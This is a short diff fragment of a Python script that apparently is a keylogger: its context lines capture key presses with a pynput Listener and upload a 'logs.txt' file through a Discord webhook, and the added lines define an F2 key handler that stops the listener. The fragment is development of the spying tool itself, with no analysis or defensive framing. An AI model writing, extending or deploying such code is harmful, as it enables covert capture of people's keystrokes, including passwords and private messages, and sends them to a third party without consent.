@@ -37,6 +37,11 @@ def discord_webhook_send(webhook_url):
         webhook.add_file(file=f.read(), filename="logs.txt")
     response = webhook.execute()
 
+def on_release(key):
+    if key == Key.f2:
+        # Stop listener
+        return False
+
 def logging():
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
